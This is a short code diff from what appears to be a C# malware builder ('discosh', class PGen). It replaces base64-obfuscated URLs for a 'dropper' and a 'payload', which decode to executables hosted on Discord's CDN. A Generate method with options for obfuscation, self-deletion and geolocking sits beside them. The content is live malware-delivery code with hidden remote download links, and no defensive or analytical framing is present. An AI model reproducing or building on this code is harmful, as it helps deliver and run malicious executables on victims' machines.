@@ -6,8 +6,8 @@ namespace discosh
 {
     public class PGen
     {
-        private static string dropper_uri = "aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTU4NzQzMTgzODE3MzM5MDAzLzk1ODk5Mjc4MjE4ODQ5ODk1NC9oZXlhLmV4ZQ==";
-        private static string payload_uri = "aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTU4NzQzMTgzODE3MzM5MDAzLzk1ODk5MjQ0MDkzMTUzMjgxMC9oaS5leGU=";
+        private static string dropper_uri = "aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTU4NzQzMTgzODE3MzM5MDAzLzk1OTA0NDM5OTI0ODA2MDQxNi9oZXlhLmV4ZQ==";
+        private static string payload_uri = "aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTU4NzQzMTgzODE3MzM5MDAzLzk1OTA0MzkwMjg0MzgwNTc5Ni9oaS5leGU=";
 
         public static byte[] Generate(string token, string prefix, bool obf, bool delself, string geolock, bool ponly)
         {
